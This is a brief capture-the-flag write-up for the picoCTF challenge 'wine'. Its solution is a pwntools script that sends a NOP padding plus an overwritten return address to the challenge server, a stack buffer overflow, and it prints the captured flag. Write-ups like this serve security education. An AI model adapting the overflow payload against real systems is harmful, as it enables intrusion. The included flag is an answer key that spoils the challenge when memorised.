# wine

### Description
> Challenge best paired with wine.

### Solution
I debugged on the server.

All that remains is to match the offset and overwrites the return address.

```python
from pwn import *

host = "saturn.picoctf.net"
port = 64813
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = remote(host, port)
pld = b"\x90"*140 + b"\x30\x15\x40\x00"
io.sendlineafter("string!", pld)

io.interactive()
#picoCTF{Un_v3rr3_d3_v1n_11eef972}
```

### Writer
[yu1hpa](https://twitter.com/yu1hpa)

